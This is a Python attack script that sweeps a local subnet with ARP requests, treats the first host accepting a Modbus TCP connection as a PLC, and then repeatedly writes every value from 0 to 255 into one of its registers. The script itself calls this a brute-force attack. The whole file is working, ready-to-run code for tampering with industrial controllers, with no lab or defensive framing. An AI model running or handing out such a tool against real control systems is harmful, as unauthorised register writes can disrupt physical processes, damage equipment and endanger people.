from pymodbus.client import ModbusTcpClient
from scapy.all import ARP, Ether, srp
import time

# Replace with appropriate Modbus register addresses
TARGET_REGISTER = 0  # Adjust this based on the actual PLC's I/O register
BRUTE_FORCE_RANGE = range(0, 256)  # Adjust value range based on process needs

# Network parameters
SUBNET = "192.168.1.0/24"

def find_plc_ip():
    """Performs an ARP scan to find a Modbus TCP PLC on the network."""
    print("[*] Scanning network to find PLC...")
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=SUBNET), timeout=2, verbose=False)

    for send, recv in ans:
        ip = recv.psrc
        print(f"[+] Found Device: {ip}")
        
        # Simple Modbus check
        client = ModbusTcpClient(ip)
        if client.connect():
            print(f"[+] PLC detected at {ip}")
            client.close()
            return ip

    print("[-] No PLC found on the specified subnet.")
    return None

def brute_force_io(plc_ip):
    """Brute-force I/O values on a detected PLC."""
    client = ModbusTcpClient(plc_ip)

    if not client.connect():
        print("[-] Failed to connect to PLC")
        return

    print(f"[+] Connected to PLC at {plc_ip}. Starting brute-force attack...")

    try:
        while True:
            for value in BRUTE_FORCE_RANGE:
                client.write_register(TARGET_REGISTER, value)
                print(f"[+] Set register {TARGET_REGISTER} to {value}")
                time.sleep(0.2)  # Adjust timing based on process sensitivity

    except KeyboardInterrupt:
        print("\n[!] Brute-force process terminated by user.")
    finally:
        client.close()

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        brute_force_io(plc_ip)